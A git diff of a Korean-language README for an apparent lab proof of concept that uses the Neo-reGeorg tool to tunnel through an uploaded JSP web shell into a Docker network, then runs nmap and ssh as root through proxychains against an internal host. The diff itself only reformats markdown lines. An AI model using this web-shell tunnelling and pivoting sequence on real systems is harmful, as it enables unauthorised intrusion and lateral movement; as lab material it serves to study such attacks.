@@ -5,17 +5,17 @@ Tunneling_Webshell POC
 `git clone https://github.com/L-codes/Neo-reGeorg.git`
 
 ### 2. 환경 설치
-`git clone https://github.com/jinsu9758/Tunneling_Webshell-POC.git`
+`git clone https://github.com/jinsu9758/Tunneling_Webshell-POC.git`  
 `cd Tunneling_Webshell`
 
 
 ### 3. 컨테이너 생성 및 백그라운드 실행
-`sudo docker compose up -d`
+`sudo docker compose up -d`  
 `sudo docker compose ps`
 
 
 ### 4. 비밀번호를 'password'으로 설정하여 서버 파일 생성
-`cd Neo-reGeorg`
+`cd Neo-reGeorg`  
 `python3 neoreg.py generate -k password`
 
 ### 5. 업로드
@@ -33,6 +33,6 @@ Tunneling_Webshell POC
 `python3 neoreg.py -k password -u http://{local_ip}:8000/tunnel.jsp`
 
 ### 9. proxychains 실행
-`proxychains4 nmap 172.30.0.30`
-proxychains4 ssh root@172.30.0.30
+`proxychains4 nmap 172.30.0.30`  
+`proxychains4 ssh root@172.30.0.30`
 
